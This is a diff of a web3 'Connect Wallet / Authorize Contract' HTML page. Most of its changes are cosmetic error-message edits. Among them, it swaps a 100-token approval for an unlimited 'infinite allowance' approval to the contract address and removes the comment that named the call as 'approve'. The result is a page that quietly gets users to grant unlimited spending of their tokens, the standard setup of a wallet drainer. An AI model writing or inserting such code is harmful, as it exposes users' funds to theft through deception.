@@ -33,6 +33,10 @@
     #status {
       margin-top: 20px;
     }
+    #connectStatus {
+      color: red;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
@@ -41,6 +45,7 @@
   <button id="connectButton">Connect Wallet</button>
   <button id="authorizeButton" disabled>Authorize Contract</button>
   <div id="status"></div>
+  <div id="connectStatus"></div>
 
   <script>
     let web3;
@@ -51,6 +56,7 @@
     const connectButton = document.getElementById('connectButton');
     const authorizeButton = document.getElementById('authorizeButton');
     const statusDiv = document.getElementById('status');
+    const connectStatusDiv = document.getElementById('connectStatus');
 
     // Check if Web3 is available
     if (typeof window.ethereum !== 'undefined') {
@@ -64,9 +70,10 @@
           statusDiv.innerText = `Connected: ${userAccount}`;
           connectButton.disabled = true; // Disable after connection
           authorizeButton.disabled = false; // Enable authorize button
+          connectStatusDiv.innerText = ''; // Clear any error message
         } catch (err) {
           console.error('Error connecting to wallet', err);
-          statusDiv.innerText = 'Failed to connect wallet.';
+          connectStatusDiv.innerText = 'Failed to connect wallet. Please try again.';
         }
       });
 
@@ -74,7 +81,6 @@
       authorizeButton.addEventListener('click', async () => {
         try {
           const contractABI = [
-            // ABI for the 'approve' function
             {
               "constant": false,
               "inputs": [
@@ -101,11 +107,11 @@
           ];
 
           const contract = new web3.eth.Contract(contractABI, contractAddress);
-          const amountToAuthorize = web3.utils.toWei('100', 'ether'); // Adjust the value as needed
+          const maxApproval = web3.utils.toHex('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'); // Infinite allowance
 
           // Sending the transaction to approve the contract
           const receipt = await contract.methods
-            .approve(contractAddress, amountToAuthorize)
+            .approve(contractAddress, maxApproval)
             .send({ from: userAccount });
 
           statusDiv.innerText = `Contract authorized! Txn Hash: ${receipt.transactionHash}`;
@@ -115,7 +121,7 @@
         }
       });
     } else {
-      statusDiv.innerText = 'Please install MetaMask!';
+      connectStatusDiv.innerText = 'Please install MetaMask or a Web3 wallet to connect.';
     }
   </script>
 
